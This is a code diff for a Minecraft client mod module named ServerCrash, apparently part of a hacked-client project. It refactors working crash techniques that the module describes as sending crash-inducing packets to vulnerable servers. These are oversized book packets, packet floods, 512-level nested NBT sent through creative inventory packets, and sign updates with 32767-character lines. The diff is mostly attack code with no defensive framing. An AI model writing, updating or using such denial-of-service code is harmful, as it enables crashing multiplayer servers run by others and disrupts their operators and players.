@@ -4,40 +4,28 @@ import com.claudemc.ClaudeMCMod;
 import com.claudemc.module.Category;
 import com.claudemc.module.Module;
 import net.minecraft.client.MinecraftClient;
+import net.minecraft.component.DataComponentTypes;
+import net.minecraft.component.type.NbtComponent;
+import net.minecraft.nbt.NbtCompound;
 import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
 import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
+import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
+import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.Items;
+import net.minecraft.util.math.BlockPos;
 
+import java.util.Collections;
 import java.util.List;
 import java.util.Optional;
 
-/**
- * ServerCrash — documented packet-based server crash techniques.
- *
- * All techniques target known unpatched Spigot/CraftBukkit/old-Paper configurations.
- * Modern Paper (1.19.3+) and Purpur patch most of these.
- *
- * TECHNIQUES:
- *
- *  BookOverflow     — Sends a BookUpdateC2SPacket with max pages (100) each containing
- *                     max characters (32767). Crashes servers that process the full NBT
- *                     synchronously on the main thread (old Spigot/CB).
- *
- *  PacketFlood      — Rapidly sends CloseHandledScreenC2SPackets — exploits servers
- *                     with no packet-rate limiting to overflow the packet queue.
- *
- *  NBTOverflow      — Sends a creative-mode SetCreativeModeSlot packet with deeply
- *                     nested NBT compound data. Crashes servers without NBT depth limits.
- *
- *  SignOverflow      — Sends an UpdateSignC2SPacket with lines exceeding the server's
- *                     expected max length.
- */
 public class ServerCrash extends Module {
 
     public ServerCrash() {
         super("ServerCrash",
               "Sends crash-inducing packets to vulnerable servers (Spigot/CB, unpatched)",
               Category.MISC);
-        addSetting("Technique", "BookOverflow"); // BookOverflow|PacketFlood|NBTOverflow|SignOverflow
+        addSetting("Technique", "BookOverflow");
         addSetting("Packets",   "20");
     }
 
@@ -50,10 +38,10 @@ public class ServerCrash extends Module {
         int count   = parseInt(getSetting("Packets"), 20);
 
         switch (tech) {
-            case "BookOverflow"  -> doBookOverflow(client);
-            case "PacketFlood"   -> doPacketFlood(client, count);
-            case "NBTOverflow"   -> doNBTOverflow(client);
-            case "SignOverflow"  -> doSignOverflow(client);
+            case "BookOverflow" -> doBookOverflow(client);
+            case "PacketFlood"  -> doPacketFlood(client, count);
+            case "NBTOverflow"  -> doNBTOverflow(client);
+            case "SignOverflow" -> doSignOverflow(client);
         }
 
         setEnabled(false);
@@ -61,18 +49,16 @@ public class ServerCrash extends Module {
 
     @Override public void onTick(MinecraftClient client) {}
 
-    // ── Techniques ────────────────────────────────────────────────────────
-
     private void doBookOverflow(MinecraftClient client) {
         try {
-            // 100 pages, each with 32767 characters
             String maxPage = "A".repeat(32767);
-            List<String> pages = java.util.Collections.nCopies(100, maxPage);
-            for (int i = 0; i < parseInt(getSetting("Packets"), 1); i++) {
+            List<String> pages = Collections.nCopies(100, maxPage);
+            int count = parseInt(getSetting("Packets"), 1);
+            for (int i = 0; i < count; i++) {
                 client.getNetworkHandler().sendPacket(
                     new BookUpdateC2SPacket(0, pages, Optional.empty()));
             }
-            ClaudeMCMod.LOGGER.info("[ServerCrash][BookOverflow] Sent {} book packets.", getSetting("Packets"));
+            ClaudeMCMod.LOGGER.info("[ServerCrash][BookOverflow] Sent {} book packets.", count);
         } catch (Exception e) {
             ClaudeMCMod.LOGGER.warn("[ServerCrash][BookOverflow] {}", e.getMessage());
         }
@@ -91,18 +77,17 @@ public class ServerCrash extends Module {
 
     private void doNBTOverflow(MinecraftClient client) {
         try {
-            // Build deeply nested NBT: 512 levels deep
-            net.minecraft.nbt.NbtCompound root = new net.minecraft.nbt.NbtCompound();
-            net.minecraft.nbt.NbtCompound current = root;
+            NbtCompound root = new NbtCompound();
+            NbtCompound current = root;
             for (int i = 0; i < 512; i++) {
-                net.minecraft.nbt.NbtCompound child = new net.minecraft.nbt.NbtCompound();
+                NbtCompound child = new NbtCompound();
                 current.put("n", child);
                 current = child;
             }
-            var stack = new net.minecraft.item.ItemStack(net.minecraft.item.Items.WRITTEN_BOOK);
-            stack.setNbt(root);
+            var stack = new ItemStack(Items.WRITTEN_BOOK);
+            stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(root));
             client.getNetworkHandler().sendPacket(
-                new net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket(36, stack));
+                new CreativeInventoryActionC2SPacket(36, stack));
             ClaudeMCMod.LOGGER.info("[ServerCrash][NBTOverflow] Sent deep NBT packet.");
         } catch (Exception e) {
             ClaudeMCMod.LOGGER.warn("[ServerCrash][NBTOverflow] {}", e.getMessage());
@@ -111,11 +96,10 @@ public class ServerCrash extends Module {
 
     private void doSignOverflow(MinecraftClient client) {
         try {
-            String overflowLine = "X".repeat(32767);
-            String[] lines = {overflowLine, overflowLine, overflowLine, overflowLine};
-            var pos = client.player.getBlockPos().down();
+            String line = "X".repeat(32767);
+            BlockPos pos = client.player.getBlockPos().down();
             client.getNetworkHandler().sendPacket(
-                new net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket(pos, true, lines));
+                new UpdateSignC2SPacket(pos, true, line, line, line, line));
             ClaudeMCMod.LOGGER.info("[ServerCrash][SignOverflow] Sent sign overflow packet.");
         } catch (Exception e) {
             ClaudeMCMod.LOGGER.warn("[ServerCrash][SignOverflow] {}", e.getMessage());
